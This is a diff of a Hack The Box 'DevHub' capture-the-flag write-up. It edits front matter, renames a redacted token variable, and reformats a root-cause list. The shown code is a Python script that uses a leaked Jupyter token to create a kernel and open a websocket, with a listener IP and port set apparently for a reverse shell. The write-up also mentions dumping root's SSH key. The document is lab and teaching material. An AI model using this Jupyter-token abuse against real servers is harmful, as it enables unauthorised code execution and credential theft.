@@ -1,4 +1,4 @@
-﻿---
+---
 title: "HTB DevHub Writeup"
 summary: "Linux writeup covering web enumeration, Jupyter token exposure, API abuse, and privilege escalation."
 date: 2026-06-05
@@ -8,9 +8,10 @@ tags:
   - web
   - jupyter
   - api
-category: "web-exploitation"
+  - recon
+category: "hack-the-box"
 difficulty: "medium"
-platform: "hack-the-box"
+platform: "hackthebox"
 boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png"
 draft: false
 ---
@@ -345,14 +346,14 @@ On the target:
 cat > /tmp/jup_raw.py <<'PY'
 import json, uuid, datetime, urllib.request, socket, base64, os, struct
 
-TOKEN="[REDACTED_TOKEN]"
+JUPYTER_AUTH="[redacted-jupyter-auth-value]"
 LHOST="[REDACTED_VPN_IP]"
 LPORT="5555"
 HOST="127.0.0.1"
 PORT=8888
 
 req=urllib.request.Request(
- f"http://{HOST}:{PORT}/api/kernels?token={TOKEN}",
+ f"http://{HOST}:{PORT}/api/kernels?token={JUPYTER_AUTH}",
  data=b"{}",
  headers={"Content-Type":"application/json"},
  method="POST"
@@ -360,7 +361,7 @@ req=urllib.request.Request(
 kid=json.loads(urllib.request.urlopen(req).read())["id"]
 sid=str(uuid.uuid4())
 
-path=f"/api/kernels/{kid}/channels?session_id={sid}&token={TOKEN}"
+path=f"/api/kernels/{kid}/channels?session_id={sid}&token={JUPYTER_AUTH}"
 key=base64.b64encode(os.urandom(16)).decode()
 
 s=socket.create_connection((HOST,PORT))
@@ -608,41 +609,41 @@ cat /root/[REDACTED_FLAG_PATH]
 The compromise was caused by multiple chained misconfigurations:
 
 1. **MCPJam command execution exposure**
-    
+
     - The MCP Inspector allowed unauthenticated creation of STDIO-based MCP servers.
-        
+
     - External users should not be able to define arbitrary commands.
-        
+
 2. **Jupyter token leakage**
-    
+
     - Jupyter was started with the token in process arguments.
-        
+
     - Secrets should not be passed through command-line arguments because local users can read them with `ps`.
-        
+
 3. **Sensitive local services**
-    
+
     - Jupyter and OPSMCP were bound to localhost, but a low-privileged shell could still access them.
-        
+
     - Localhost-only binding is not sufficient once any local user is compromised.
-        
+
 4. **Hardcoded OPSMCP API key**
-    
+
     - The API key was stored directly in source code.
-        
+
     - Secrets should be stored using a secure secret manager or protected environment files.
-        
+
 5. **Root service exposed dangerous hidden functionality**
-    
+
     - OPSMCP ran as root and included a hidden function that could dump `/root/.ssh/id_rsa`.
-        
+
     - Root services should follow least privilege and must not expose credential-dumping functionality.
-        
+
 6. **Weak file ownership model**
-    
+
     - `/opt/opsmcp/server.py` was owned by `analyst` while being executed by root.
-        
+
     - Root-executed service files should be owned by root and not writable by non-root users.
-        
+
 
 ---
 
